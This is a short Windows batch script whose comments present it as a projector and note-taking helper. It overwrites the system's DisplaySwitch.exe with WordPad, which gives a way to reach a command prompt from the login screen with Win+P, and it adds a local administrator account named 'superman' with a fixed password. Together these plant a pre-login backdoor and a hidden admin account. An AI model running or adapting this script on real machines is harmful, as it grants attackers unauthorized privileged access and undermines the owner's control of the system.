@echo off

:: DisplaySwitch is the program that enables the use of an external monitor, such as a projector.
:: It can be started on a windows machine at any time, by pressing the win key and P
:: This even works during the login screen.  
:: If the DisplaySwitch.exe is replaced (copied over) by another program, then that will run instead.

:: taskmgr.exe is a useful set of utilitys that can be run by pressing Ctrl+Alt+Del
:: A cmd prompt can be started from Task Manager with; File > Run new task, type cmd in the run box
:: However, taskmgr.exe dosn't run properly in place of DisplaySwitch.exe

:: write.exe runs in place of DisplaySwitch.exe, it is the wordpad wordprocessor program.
:: This will allow quick notes to be written before anyone logs in to their account.
:: a command line can be started through the file menu, by navigating to and opening windows\System32\cmd.exe  

copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplayProject.exe
copy C:\Windows\System32\write.exe C:\Windows\System32\DisplaySwitch.exe
:: Make a link 'Projector Display Connect.lnk' to DisplaySwitch.exe, for using a Projector display

:: make the account Superman & password clarkent 
net user superman clarkent /add

:: elevate Superman privilege to an Administrator
net localgroup administrators superman /add

:: show what we did
net user superman
pause
